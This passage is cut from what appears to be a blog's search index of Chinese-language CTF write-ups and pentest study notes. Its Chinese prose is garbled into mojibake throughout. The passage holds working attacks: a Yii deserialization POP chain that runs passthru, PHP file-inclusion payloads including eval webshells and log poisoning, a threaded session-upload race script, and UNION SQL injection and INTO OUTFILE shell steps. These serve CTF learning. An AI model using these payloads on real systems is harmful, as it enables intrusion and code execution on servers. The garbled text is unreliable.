å‚æ–¹æ³•ã€‚å‘ç°äº†IndexAction.phpä¸­çš„runæ–¹æ³•\nyii\\rest\\IndexAction.php\n    public function run()\n    {\n        if ($this->checkAccess) {\n            call_user_func($this->checkAccess, $this->id);\n        }\n\n        return $this->prepareDataProvider();\n    }\nåœ¨runæ–¹æ³•ä¸­checkAccesså’Œidéƒ½å¯æ§ï¼Œåˆ©ç”¨é“¾æ„é€ æˆåŠŸ\n```\n\nåˆ©ç”¨é“¾\n\n`yii\\db\\BatchQueryResult::__destruct() -> Faker\\Generator::__call() -> yii\\rest\\IndexAction::run()`\n\n```php\npoc\n<?php\nnamespace yii\\rest{\n    class CreateAction{\n        public $checkAccess;\n        public $id;\n\n        public function __construct(){\n            $this->checkAccess = 'passthru';\n            $this->id = 'tac /flag';\n        }\n    }\n}\n\nnamespace Faker{\n    use yii\\rest\\CreateAction;\n\n    class Generator{\n        protected $formatters;\n\n        public function __construct(){\n            $this->formatters['close'] = [new CreateAction(), 'run'];\n        }\n    }\n}\n\nnamespace yii\\db{\n    use Faker\\Generator;\n\n    class BatchQueryResult{\n        private $_dataReader;\n\n        public function __construct(){\n            $this->_dataReader = new Generator;\n        }\n    }\n}\nnamespace{\n    echo base64_encode(serialize(new yii\\db\\BatchQueryResult));\n}\n?>\n\n```\n\n","tags":["CTF","web"]},{"title":"PHPåºåˆ—åŒ–","url":"/2022/03/22/PHPåºåˆ—åŒ–/","content":"\nåºåˆ—åŒ–çš„æ¦‚å¿µï¼šæŠŠä¸€ä¸ªå¯¹è±¡è½¬ä¸ºå­—ç¬¦ä¸²\n\nåºåˆ—åŒ–çš„å¥½å¤„ï¼š\n\n1ã€æœ‰åˆ©äºæ•°æ®å­˜å‚¨\n\n2ã€æ–¹ä¾¿æ•°æ®ä¼ é€’\n\nåºåˆ—åŒ–åå­—ç¬¦ä¸²çš„æ ¼å¼\n\n```\nPublicå±æ€§åºåˆ—åŒ–åæ ¼å¼ï¼šæˆå‘˜å\nPrivateå±æ€§åºåˆ—åŒ–åæ ¼å¼ï¼š%00ç±»å%00æˆå‘˜å\nProtectå±æ€§åºåˆ—åŒ–åæ ¼å¼ï¼š%00*%00æˆå‘˜å\n```\n\nO:å¯¹è±¡ç±»åé•¿åº¦:\"å¯¹è±¡ç±»å\":å¯¹è±¡å±æ€§ä¸ªæ•°{å±æ€§åç±»å‹:å±æ€§åé•¿åº¦:\"å±æ€§åå­—\";å±æ€§ç±»å‹:å±æ€§é•¿åº¦:\"å±æ€§å†…å®¹\"}\n\n```\nPHPåºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ–¹æ³•ï¼š\n1ã€__construct å½“ä¸€ä¸ªå¯¹è±¡è¢«åˆ›å»ºæ—¶è°ƒç”¨\n2ã€__destruct å½“ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯æ—¶è°ƒç”¨\n3ã€__toString å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²æ—¶ä½¿ç”¨\n4ã€__sleep åœ¨å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ\n5ã€__wakeup åœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–ä¹‹åè°ƒç”¨\n```\n\né€šè¿‡ä¸€é“é¢˜æ¥å°è¯•ä¸€ä¸‹å§ï¼š[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz\n\né¢˜ç›®ä»£ç ï¼š\n\n```PHP\n<?php\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nclass FileHandler {\n    protected $op;\n    protected $filename;\n    protected $content;\n    function __construct() {\n        $op = \"1\";\n        $filename = \"/tmp/tmpfile\";\n        $content = \"Hello World!\";\n        $this->process();\n    }\n    public function process() {\n        if($this->op == \"1\") {\n            $this->write();\n        } else if($this->op == \"2\") {\n            $res = $this->read();\n            $this->output($res);\n        } else {\n            $this->output(\"Bad Hacker!\");\n        }\n    }\n    private function write() {\n        if(isset($this->filename) && isset($this->content)) {\n            if(strlen((string)$this->content) > 100) {\n                $this->output(\"Too long!\");\n                die();\n            }\n            $res = file_put_contents($this->filename, $this->content);\n            if($res) $this->output(\"Successful!\");\n            else $this->output(\"Failed!\");\n        } else {\n            $this->output(\"Failed!\");\n        }\n    }\n    private function read() {\n        $res = \"\";\n        if(isset($this->filename)) {\n            $res = file_get_contents($this->filename);\n        }\n        return $res;\n    }\n    private function output($s) {\n        echo \"[Result]: <br>\";\n        echo $s;\n    }\n    function __destruct() {\n        if($this->op === \"2\")\n            $this->op = \"1\";\n        $this->content = \"\";\n        $this->process();\n    }\n}\nfunction is_valid($s) {\n    for($i = 0; $i < strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))\n            return false;\n    return true;\n}\nif(isset($_GET{'str'})) {\n    $str = (string)$_GET['str'];\n    if(is_valid($str)) {\n        $obj = unserialize($str);\n    }\n}\n```\n\næ˜¾ç„¶ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦æ‹¿åˆ°flagä¸­çš„å†…å®¹å°±éœ€è¦è¿›è¡Œè¯»æ“ä½œï¼Œæ“ä½œçš„æ–‡ä»¶åæ˜¯flag.phpï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•åœ¨æœ¬åœ°æ„é€ ä¸€ä¸ªå¯¹åº”çš„ç±»å¹¶ä¸”å°†å…¶åºåˆ—åŒ–\n\n```PHP\n<?php\n\tclass FileHandler {\n    protected $op=2;\n    protected $filename='flag.php';\n    protected $content=1;\n\t}\n\t$s=new FileHandler();\n\techo serialize($s);\n?>\n```\n\nå°è¯•ç”Ÿæˆçš„å­—ç¬¦ä¸²ä½œä¸ºpayloadå‘ç°å¤±è´¥ï¼ŒåŸå› æ˜¯åœ¨è¿™ä¸ªç±»é‡Œé¢æ¯ä¸ªå˜é‡éƒ½æ˜¯ä¿æŠ¤å±æ€§ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¼šè¢«åºåˆ—åŒ–ä¸º**%00ç±»å%00æˆå‘˜å**å¾ˆæ˜æ˜¾%00æ˜¯æˆ‘ä»¬ä¸éœ€è¦çš„ï¼Œæ‰€ä»¥éœ€è¦å°†æœ¬åœ°ç”Ÿæˆç±»ä¸­æ”¹ä¸ºpublicå±æ€§\n\n```PHP\n<?php\n\tclass FileHandler {\n    public $op=2;\n    public $filename='flag.php';\n    public $content=1;\n\t}\n\t$s=new FileHandler();\n\techo serialize($s);\n?>\n```\n\nè·å–å­—ç¬¦ä¸²åæŸ¥çœ‹æºç æ‹¿åˆ°flag\n","tags":["CTF","web"]},{"title":"CTFshowæ–‡ä»¶åŒ…å«","url":"/2022/03/22/CTFshowæ–‡ä»¶åŒ…å«/","content":"\n##### 78\n\n```\npayload:?file=php://filter/convert.base64-encode/resource=flag.php\n```\n\næ— è¿‡æ»¤ç›´æ¥ä¼ªåè®®è¯»å–flag\n\n##### 79\n\n```\npayload:?file=data://text/plain,<?=eval($_POST['cmd']);?>\nPOST\ncmd=system('cat flag.php');\n\npayload:?file=data://text/plain,base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=\n```\n\nè¿‡æ»¤äº†phpï¼Œå¯ä½¿ç”¨dataåè®®ï¼Œé€šè¿‡å†ä¼ å…¥ä¸€ä¸ªå‚æ•°æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¹Ÿå¯base64è§£ç å‡ºæƒ³æ‰§è¡Œçš„å‘½ä»¤\n\n##### 80\n\n```\n?file=/var/log/nginx/access.log\nHEADER\nUser-Agent=<?php eval($_POST[['cmd']]);?>\nPOST\ncmd=system('cat fl0g.php');\n```\n\nè¿‡æ»¤äº†dataï¼Œå¯é€šè¿‡åŒ…å«æ—¥å¿—æ¥æ‰§è¡Œå‘½ä»¤\n\n##### 81\n\n```\n?file=/var/log/nginx/access.log\nHEADER\nUser-Agent=<?php eval($_POST[['cmd']]);?>\nPOST\ncmd=system('cat fl0g.php');\n```\n\nè¿‡æ»¤äº†å†’å·ï¼Œæ—¥å¿—åŒ…å«ä¾ç„¶å¯è¡Œ\n\n##### 82\n\nè¿‡æ»¤äº†.ï¼Œåªèƒ½åŒ…å«æ— åç¼€æ–‡ä»¶ï¼Œåœ¨PHPä¸­å”¯ä¸€èƒ½æ§åˆ¶çš„æ— åç¼€æ–‡ä»¶å°±æ˜¯sessionæ–‡ä»¶ï¼Œæ‰€ä»¥å°è¯•é€šè¿‡è„šæœ¬ç«äº‰åŒ…å«å†™å…¥\n\n```\nåŸç†ï¼šåœ¨æˆ‘ä»¬è‡ªè¡Œæ·»åŠ PHPSSEIDåˆ°ç½‘é¡µä¸­æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶åœ¨/tmp/sess_nameï¼Œæ–‡ä»¶åå¯æ§ã€‚æ–‡ä»¶å†…å®¹é€šè¿‡PHP_ SESSION_UPLOAD_PROGRESSå‚æ•°æ§åˆ¶ï¼Œè¯¥å‚æ•°ç”¨äºå®æ—¶è·å–æ–‡ä»¶ä¸Šä¼ è¿›åº¦ï¼Œä¼šè¿”å›ä¸€ä¸ªSESSIONï¼Œå¹¶ä¸”è¯¥å‚æ•°çš„å†…å®¹å°†ä¼šè¢«åŠ å…¥åˆ°sess_nameæ–‡ä»¶ä¸­\næ–¹æ³•ï¼šä¸€è¾¹æ„é€ POSTæ–‡ä»¶ä¼ è¾“è¯·æ±‚ï¼Œå°†PHP_SESSION_UPLOAD_PROGRESSåŒ…å«åˆ°è¯·æ±‚å¤´ä¸­ï¼Œä¸€è¾¹åŒ…å«/tmp/sess_nameæ–‡ä»¶\n```\n\n##### 83-86\n\n```Python\n# ç«äº‰ä¸‡èƒ½è„šæœ¬ï¼š\n# os.system('rm -rf /bin/Azuki')\n# æ¶ˆç­Azukiä¿å¹³å®‰\nimport io\nimport requests\nimport threading\n\nsessID = 'flag'\nurl = 'http://193cefd4-47a6-444e-801b-39906604df13.challenge.ctf.show/'\n\n\ndef write(session):\n    while event.isSet():\n        f = io.BytesIO(b'a' * 1024 * 50)\n        response = session.post(\n            url,\n            cookies={'PHPSESSID': sessID},\n            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php system(\"cat *.php\");?>'},\n            files={'file': ('test.txt', f)}\n        )\n\n\ndef read(session):\n    while event.isSet():\n        response = session.get(url + '?file=/tmp/sess_{}'.format(sessID))\n        if 'test' in response.text:\n            print(response.text)\n            event.clear()\n        else:\n            print('[*]retrying...')\n\n\nif __name__ == '__main__':\n    event = threading.Event()\n    event.set()\n    with requests.session() as session:\n        for i in range(1, 30):\n            threading.Thread(target=write, args=(session,)).start()\n\n        for i in range(1, 30):\n            threading.Thread(target=read, args=(session,)).start()\n```\n\n**87**\n\nå…ˆè´´ä¸€ä¸ª[æ–‡ç« ](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)\n\nå¯¹äºphp://filterçš„ä½¿ç”¨\n\nç®€å•ç‰ˆæœ¬ï¼šä½¿ç”¨rot13ç¼–è§£ç ç»•è¿‡\n\n```\npayload:?file=php://filter/write=string.rot13/resource=1.phpï¼ˆè®°å¾—è¿›è¡Œä¸¤æ¬¡URLç¼–ç ï¼‰\nPOST:\npbagrag=<?cuc flfgrz('gnp s*.cuc');?>\n<?php system('tac f*.php');?>ç»è¿‡rot13ç¼–ç \n```\n\nå¤æ‚ç‰ˆæœ¬ï¼šä½¿ç”¨base64ç¼–è§£ç ç»•è¿‡\n\n```\npayload:?file=php://filter/write=string.rot13/resource=1.phpï¼ˆè®°å¾—è¿›è¡Œä¸¤æ¬¡URLç¼–ç ï¼‰\nPOST:\npbagrag=<?cuc flfgrz('gnp s*.cuc');?>\n<?php system('tac f*.php');?>ç»è¿‡rot13ç¼–ç \n```\n\nåŸç†ï¼šåœ¨è¿‡æ»¤å™¨è¿›è¡Œbase64ç¼–è§£ç æ—¶ï¼Œä¼šç»•è¿‡æ‰€æœ‰ä¸å±äºbase64ç¼–ç åçš„å­—ç¬¦ï¼ˆ+, / , 0~9,a~z,A~Zï¼‰ï¼Œæ¯”å¦‚é¢˜ä¸­çš„`<?php die(\"å¤§ä½¬åˆ«ç§€äº†\");?>`ï¼Œè¿‡æ»¤å™¨è¯†åˆ«åˆ°çš„å­—ç¬¦åªæœ‰phpdieï¼Œå…¶ä½™çš„å­—ç¬¦è¢«å¿½ç•¥ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨æˆ‘ä»¬å·²ç»ç¼–å¥½çš„base64æ–‡æœ¬åŠ ä¸¤ä¸ªå­—æ¯å³å¯è®©phpdiexxè¢«è§£æä¸ºbase64ç¼–ç åè¯­å¥ï¼Œä¸åé¢ä»£ç æ— å…³äº†\n\n**88**\n\næ„é€ è¯­å¥ä½¿å¾—base64ç¼–ç ååªå«æ•°å­—å’Œå­—æ¯å³å¯\n\n```\npayload:?file=data://text/plain;base64,PD9waHAgICBldmFsKCRfUE9TVFsxXSk7\n//<?php   eval($_POST[1]);\nPOST:\n1=system('tac f*');\n```\n\n","tags":["CTF","web"]},{"title":"å°è¿ª","url":"/2022/03/08/å°è¿ª/","content":"\n# ä¿¡æ¯æ”¶é›†\n\n## Day 7 CDNç»•è¿‡\n\nåˆ¤æ–­æŸç½‘ç«™æ˜¯å¦ä½¿ç”¨CDNæœåŠ¡ï¼šä½¿ç”¨å¤šèŠ‚ç‚¹è®¿é—®ï¼ŒæŸ¥çœ‹è¿”å›IPæ˜¯å¦ç›¸åŒ\n\n#### CDNç»•è¿‡ï¼š\n\n1ã€å­åŸŸåæŸ¥è¯¢ï¼šxxx.åŸå§‹åŸŸå\n\nå­åŸŸåæŸ¥è¯¢ï¼šhttps://tool.chinaz.com/subdomain/\n\n2ã€é‚®ä»¶æœåŠ¡æŸ¥è¯¢ï¼šä½¿ç”¨é‚®ä»¶æœåŠ¡æ—¶å¤§éƒ¨åˆ†ä¸ä¼šä½¿ç”¨CDNï¼Œå°è¯•æ”¶å–æ¥è‡ªè¯¥åŸŸåçš„é‚®ä»¶å¹¶æŸ¥çœ‹åŸå§‹é‚®ä»¶æ ‡å¤´\n\n3ã€å›½å¤–åœ°å€è¯·æ±‚ï¼šé’ˆå¯¹å›½å†…ç½‘ç«™ï¼Œå¤§éƒ¨åˆ†ä¸ä¼šå¼€è®¾å›½å¤–CDN\n\n4ã€é—ç•™æ–‡ä»¶ï¼Œæ‰«æå…¨ç½‘ï¼šä¾‹å¦‚phpinfoï¼Œæ¢é’ˆç­‰ï¼Œæ‰«æå…¨ç½‘ä½¿ç”¨\n\n5ã€é»‘æš—æœç´¢å¼•æ“æœç´¢ç‰¹å®šæ–‡ä»¶ï¼šShodanï¼Œzoomeyeï¼Œfofa\n\næœå“ˆå¸Œï¼šä»¥ç½‘é¡µfavicon.icoä¸ºä¾‹\n\n```python\nimport mmh3\nimport requests\n\nre=requesets.get('åœ°å€')\nfav=re.content.encode('base64')\nhas=mh3.hash(fav)\nprint 'http.favicon.hash:'+str(hash)\n```\n\nè·å¾—ç»“æœååˆ°é»‘æš—å¼•æ“ä¸­æœç´¢ç‰¹å®šå†…å®¹\n\n6ã€DNSå†å²è®°å½•\n\n7ã€~~DDOSæ‰“çˆ†~~\n\n8ã€ç¬¬ä¸‰æ–¹æ¥å£ï¼šget-site-ip.comï¼Œthreatbook.cn\n\n<!--more-->\n\n## DAY 8 æ¶æ„ æ­å»º WAF\n\næµç¨‹ï¼šé¦–å…ˆæŸ¥çœ‹æ˜¯å¦èƒ½è·å¾—æºç ï¼Œå¦‚æœæ˜¯å¼€æºé¡¹ç›®å¯ç›´æ¥å»çš„æºç \n\nè€ŒåæŸ¥çœ‹æœåŠ¡å™¨çš„æ“ä½œç³»ç»Ÿï¼Œæ­å»ºå¹³å°ï¼Œæ•°æ®åº“ç±»å‹\n\nè¿›è€ŒæŸ¥çœ‹å„ç§ç«™ç‚¹\n\næœ€åç»•è¿‡WAF\n\næ”»å‡»ç›®æ ‡æ˜¯å¦æœ‰APPï¼šæœ‰çš„è¯é¦–å…ˆæŸ¥çœ‹æ˜¯å¦é€šè¿‡webåè®®é€šä¿¡ï¼Œæ˜¯çš„è¯æŠ“å–æ•°æ®åŒ…ï¼Œæ²¡æœ‰\n\n{% pullquote mindmap mindmap-md %}\n- ä¿¡æ¯æœé›†\n    - æœ‰æ— webç«¯\n        - æœ‰CDN\n            - æ‰¾å‡ºçœŸå®æœåŠ¡å™¨IPåæ”»å‡»\n        - æ— CDN\n            - ç¨‹åºæºç \n                - æœªçŸ¥CMS\n                - å¼€æºCMS\n        - æœåŠ¡å™¨ä¿¡æ¯\n            - æ“ä½œç³»ç»Ÿ\n            - æ­å»ºå¹³å°\n            - æ•°æ®åº“ç±»å‹\n        - ç«™ç‚¹æ­å»º\n            - ç›®å½•ç«™ç‚¹ï¼ˆä»ä¸‹å¾€ä¸Šæ‰“ï¼Œåªè¦æ‰“é€šæ•´ä¸ªæ ¹ç›®å½•ä¸‹æ‰€æœ‰ç«™ç‚¹å…¨éƒ¨è¢«æ”»å‡»ï¼‰\n            - ç«¯å£ç«™ç‚¹\n            - å­åŸŸåç«™ç‚¹\n            - æ—æ³¨ç«™ç‚¹â€”â€”åŒæœåŠ¡å™¨ä¸åŒç«™ç‚¹\n            - Cç«¯ç«™ç‚¹â€”â€”åŒç½‘æ®µä¸‹ä¸åŒæœåŠ¡å™¨ä¸åŒç«™ç‚¹\n            - ç±»ä¼¼åŸŸåç«™ç‚¹ç­‰\n        - é˜²æŠ¤åº”ç”¨WAFâ€”â€”é€šè¿‡è„šæœ¬å—…æ¢ç‰¹å¾\n            - å¤§éƒ¨åˆ†å“åº”å¤´æœ‰X-Powered-By: WAF\n            - å®‰å…¨ç‹—\n            - å®å¡”\n            - äº‘ç›¾\n            - å®‰éª‘å£«\n    - æœ‰æ— APP\n        - èµ°webåè®®\n            - æŠ“å–æ•°æ®åŒ…èµ°webæ”»å‡»\n        - éwebåè®®\n            - å°è¯•æå–\n            - åç¼–è¯‘é€†å‘\n    - æœ‰æ— å…¶ä»–\n        - èµ„äº§ä¿¡æ¯\n            - ä»¥ä¸Šå„ç§å¹³å°ä¿¡æ¯\n            - whoiså¤‡æ¡ˆ\n            - githubç­‰ç›‘æ§\n        - ç¬¬ä¸‰æ–¹åº”ç”¨\n            - æ•°æ®åº“åº”ç”¨\n                - mysql\n                - mssql\n                - oracle\n            - ç®¡ç†å¹³å°\n                - weblogic\n                - phpmyadmin\n            - ç¬¬ä¸‰æ–¹åº”ç”¨\n                - vsftpd\n                - nexus\n                - git\n        - å„ç§æœåŠ¡æ¥å£\n            - å­˜å‚¨æœåŠ¡\n            - æ”¯ä»˜æœåŠ¡\n            - å†…éƒ¨æœåŠ¡\n        - å¾®ä¿¡å…¬ä¼—å·ç­‰ä½ç½®æ‰¾åˆ°æ›´å¤šçš„åº”ç”¨\n            - æ¶‰åŠweb\n            - æ¶‰åŠAPP\n            - æ¶‰åŠå…¶ä»–\n        - å†…éƒ¨ç¾¤æˆ–å†…éƒ¨åº”ç”¨ç­‰ï¼ˆç¤¾å·¥ï¼‰\n            - QQæˆ–å¾®ä¿¡ç¾¤\n            - å·¥ä½œç¾¤\n            - å…¶ä»–ç¾¤èŠ\n\n{% endpullquote %}\n\n## DAY 10 å…¶ä»–èµ„äº§ç›‘æ§\n\nGitHubç›‘æ§ï¼šä¾¿äºæ”¶é›†æ•´ç†æœ€æ–°expæˆ–pocï¼Œå‘ç°ç›¸å…³æµ‹è¯•ç›®æ ‡çš„èµ„äº§\n\nåŸŸåæœé›†ï¼šæšä¸¾çˆ†ç ´ï¼Œåˆ©ç”¨æ¼æ´ï¼Œä¸»ç«™çˆ¬å–ï¼ŒwhoisæŸ¥è¯¢\n\n\n\n# WEBæ¼æ´\n\n## DAY 11 webæ¼æ´ åŸºç¡€\n\nWEBæ¼æ´ç±»å‹\n\n{% pullquote mindmap mindmap-md %}\n\n- WEBæ¼æ´\n  - å¸¸è§\n    - SQLæ³¨å…¥\n      - å±å®³ï¼šè·å–åˆ°éšç§˜æ•°æ®ï¼Œè·å–ç®¡ç†å‘˜è´¦å·å¯†ç ç­‰\n    - æ–‡ä»¶ä¸Šä¼ \n    - XSSè·¨ç«™\n    - æ–‡ä»¶åŒ…å«\n    - ååºåˆ—åŒ–\n    - ä»£ç æ‰§è¡Œ\n    - é€»è¾‘å®‰å…¨\n    - æœªæˆæƒè®¿é—®\n  - ä¸å¸¸è§\n    - CSRF\n    - SSRF\n    - ç›®å½•éå†\n      - äº§ç”ŸåŸå› ï¼šä¸ºæ–¹ä¾¿å°†éœ€è¦è®¿é—®çš„æ–‡ä»¶å®šä¹‰æˆå˜é‡ï¼Œæœªå¯¹ä¼ å…¥çš„æ–‡ä»¶ç›®å½•è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´æŸäº›æ–‡ä»¶è¢«è¯»å–\n      - å±å®³ï¼šæœåŠ¡å™¨ä¸­çš„éšç§æ–‡ä»¶è¢«è¯»å–\n      - æ”»å‡»æ–¹å¼ï¼šæ‰«ï¼Œå¾€æ­»é‡Œæ‰«\n    - æ–‡ä»¶è¯»å–\n    - æ–‡ä»¶ä¸‹è½½\n    - å‘½ä»¤æ‰§è¡Œ\n    - XXEå®‰å…¨\n    - å…¶ä»–\n\n{% endpullquote %}\n\n\n\n## DAY 12ï¼Œ13 webæ¼æ´ SQLæ³¨å…¥ ç®€è¦æ³¨å…¥ MySQLæ³¨å…¥\n\n**æ•°æ®åº“æ³¨å…¥åŸºæœ¬æµç¨‹**\n\né¦–å…ˆæ˜ç¡®æ•°æ®åº“çš„ç±»å‹å’Œæƒé™\n\nç„¶åæ˜ç¡®æäº¤çš„æ–¹æ³•å’Œå‚æ•°ç±»å‹ç­‰\n\næ³¨å…¥æˆåŠŸåé¦–å…ˆæ˜ç¡®æ•°æ®åº“è®°å½•ä¿¡æ¯çš„ç³»ç»Ÿè¡¨\n\nç„¶åä¾æ¬¡å¯¹è¿›è¡Œåº“è¡¨åˆ—æ•°æ®è¿›è¡Œæ³¨å…¥æŸ¥è¯¢\n\næœ€ç»ˆç›®çš„æ‰¾åˆ°ç½‘ç«™åå°å¹¶ç™»é™†å°è¯•è·å–shell\n\nå¦‚æœæƒé™è¾ƒé«˜å¯é€šè¿‡æ–‡ä»¶è¯»å†™ï¼Œå‘½ä»¤æ‰§è¡Œå’Œæ³¨å†Œè¡¨è¯»å–æ¥getshell\n\n{% pullquote mindmap mindmap-md %}\n\n- SQLæ³¨å…¥\n  - æ•°æ®åº“ç±»å‹\n    - Access\n    - Mysql\n    - Mssql\n    - Oracle\n    - Postsql\n    - SQLite\n    - Mongodb\n    - å…¶ä»–\n  - å›æ˜¾/ç›²æ³¨\n    - å›æ˜¾æ³¨å…¥\n    - æ— å›æ˜¾æ³¨å…¥\n    - å»¶æ—¶ç›²æ³¨\n    - å¸ƒå°”ç›²æ³¨\n  - æäº¤æ–¹æ³•\n    - GET\n    - POST\n    - COOKIE\n    - REQUEST\n    - HTTPå¤´\n  - æ•°æ®ç±»å‹\n    - æ•°å­—å‹\n    - å­—ç¬¦å‹\n    - æœç´¢å‹\n  - æŸ¥è¯¢æ–¹å¼\n    - select\n    - insert\n    - delete\n    - update\n    - order by\n  - æ³¨å…¥æ‹“å±•\n    - åŠ è§£å¯†æ³¨å…¥\n    - JSONæ³¨å…¥\n    - LADPæ³¨å…¥\n    - DNSlogæ³¨å…¥\n    - äºŒæ¬¡æ³¨å…¥\n    - å †å æŸ¥è¯¢\n  - WAFç»•è¿‡\n    - æ›´æ”¹æäº¤æ–¹æ³•\n    - å¤§å°å†™æ··åˆ\n    - è§£å¯†ç¼–ç ç±»\n    - æ³¨é‡Šç¬¦æ··ç”¨\n    - ç­‰ä»·å‡½æ•°æ›¿æ¢\n    - ç‰¹æ®Šç¬¦å·æ··ç”¨\n    - å€ŸåŠ©æ•°æ®åº“ç‰¹æ€§\n    - HTTPå‚æ•°æ±¡æŸ“\n    - åƒåœ¾æ•°æ®æº¢å‡º\n  - é˜²å¾¡æ–¹æ¡ˆ\n    - ä»£ç åŠ è½½è¿‡æ»¤\n    - WAFäº§å“éƒ¨ç½²\n\n{% endpullquote %}\n\n\n\n{% pullquote mindmap mindmap-md %}\n\n- SQLæ³¨å…¥æµç¨‹\n  - ä¿¡æ¯æ”¶é›†\n    - æ“ä½œç³»ç»Ÿ\n    - æ•°æ®åº“å\n    - æ•°æ®åº“ç”¨æˆ·\n    - æ•°æ®åº“ç‰ˆæœ¬\n    - å…¶ä»–(ç½‘ç«™è·¯å¾„ç­‰)\n  - æ•°æ®æ³¨å…¥:åŒæ•°æ®åº“\n    - ä½ç‰ˆæœ¬ï¼šä½¿ç”¨æš´åŠ›æŸ¥è¯¢æˆ–è€…ç»“åˆè¯»å–æŸ¥è¯¢(MySQL 5.0ä»¥ä¸‹)\n    - é«˜ç‰ˆæœ¬ï¼šä½¿ç”¨information_schemaæœ‰æ®æŸ¥è¯¢(MySQL 5.0ä»¥ä¸Š)\n  - é«˜æƒé™æ³¨å…¥\n    - å¸¸è§„æŸ¥è¯¢\n    - è·¨åº“æŸ¥è¯¢\n    - æ–‡ä»¶è¯»å†™\n\n{% endpullquote %}\n\nMYSQLæ•°æ®åº“\n\n- ç½‘ç«™A---->æ•°æ®åº“A\n  - è¡¨A\n    - åˆ—A\n      - åˆ—Aæ•°æ®\n    - åˆ—B\n      - åˆ—Bæ•°æ®\n  - è¡¨B......\n- ç½‘ç«™B---->æ•°æ®åº“B......\n\n###### MySQLæ•°æ®åº“æ³¨å…¥\n\nMySQL 5.0ä»¥ä¸Šè‡ªå¸¦ä¸€ä¸ªinformation_schemaè¡¨è®°å½•äº†æ‰€æœ‰æ•°æ®åº“å,è¡¨å,åˆ—åçš„æ•°æ®åº“,ç›¸å½“äºå¯ä»¥é€šè¿‡å®ƒè·å–æŒ‡å®šæ•°æ®åº“ä¸‹é¢çš„è¡¨åå’Œåˆ—åä¿¡æ¯\n\ntips:æ•°æ®åº“ä¸­çš„â€œ.â€ç¬¦å·è¡¨ç¤ºä¸‹ä¸€çº§,å¦‚user.memberå°±æ˜¯useråº“ä¸‹çš„menberè¡¨\n\ninformation_schema.tables\tè®°å½•æ‰€æœ‰è¡¨åä¿¡æ¯\n\ninformation_schema.columns\tè®°å½•æ‰€æœ‰åˆ—åä¿¡æ¯\n\ntable_name\tè¡¨å\n\ncolumn_name\tåˆ—å\n\n1. **æµ‹è¯•æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥**\n\n```\nSELECT * FORM users WHERE id=1 and 1=1 LIMIT 0,1 \nå›æ˜¾æ­£å¸¸\nSELECT * FORM users WHERE id=1 and 1=2 LIMIT 0,1\nå›æ˜¾é”™è¯¯\n```\n\n2. **çŒœæµ‹å­—æ®µæ•°**\n\n```\norder by\t\t\t\t\t\tæµ‹è¯•å­—æ®µæ•°é‡\nunion select 1,2,3\tåˆ¤æ–­å›æ˜¾ä½ç½®\n```\n\n3. **ä¿¡æ¯æ”¶é›†**\n\n```\næ•°æ®åº“ç‰ˆæœ¬:version()\næ•°æ®åº“å:database()\næ•°æ®åº“ç”¨æˆ·:user()\næ“ä½œç³»ç»Ÿ:@@version_compile_os\n```\n\n4. **æŸ¥è¯¢æŒ‡å®šæ•°æ®åº“ä¸‹è¡¨å,åˆ—å,ä»»æ„æ•°æ®**\n\næŸ¥è¡¨å\n\n```\nunion select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()\n```\n\næŸ¥åˆ—å\n\n```\nunion select 1,2,group_concat(column_name) from information_schema.columns where table_name=\"åˆšåˆšæŸ¥å‡ºçš„è¡¨å\" and table_schema=\"æ•°æ®åº“å\"\n```\n\næŸ¥æ•°æ®\n\n```\nunion select 1,2,group_concat(æƒ³æŸ¥è¯¢çš„åˆ—) from æ•°æ®åº“å.è¡¨å\n```\n\n**æ–‡ä»¶è¯»å†™æ“ä½œ**\n\nç›®çš„ï¼šgetshell\n\n```\nselect load_file('æ–‡ä»¶ä½ç½®')\tè¯»å–æ–‡ä»¶\nselect 'X' into outfile æ–‡ä»¶ä½ç½®\n```\n\nmysql æ–°ç‰ˆæœ¬ä¸‹**secure-file-privå­—æ®µ ï¼š secure-file-privå‚æ•°æ˜¯ç”¨æ¥é™åˆ¶LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()ä¼ åˆ°å“ªä¸ªæŒ‡å®šç›®å½•çš„ã€‚**åœ¨è¿™ä¸ªå‚æ•°ä¹‹å¤–çš„ä½ç½®è¯»å–æ–‡ä»¶ä¼šè¿”å›NULL\n\nä¸€ä¸ªload_fileå°æç¤ºï¼šhttps://blog.csdn.net/weixin_30292843/article/details/99381669\n\n**æ–‡ä»¶è·¯å¾„çš„å¸¸è§è·å–æ–¹æ³•**ï¼š\n\næŠ¥é”™æ˜¾ç¤ºï¼šé€šè¿‡è¾“å…¥é”™è¯¯å†…å®¹å¯¼è‡´å‡½æ•°æ‰§è¡Œå‡ºé”™ï¼ŒæŠ¥é”™æ˜¾ç¤ºå‡ºæ–‡ä»¶è·¯å¾„\n\né—ç•™æ–‡ä»¶ï¼šphpinfoç­‰\n\næ¼æ´æŠ¥é”™ï¼šå„ç§æ¡†æ¶çš„é—®é¢˜\n\nå¹³å°é…ç½®æ–‡ä»¶ï¼šå¦‚apacheï¼Œnginxï¼ŒIISç­‰ä¸­é—´ä»¶\n\nçˆ†ç ´ç­‰\n\n###### 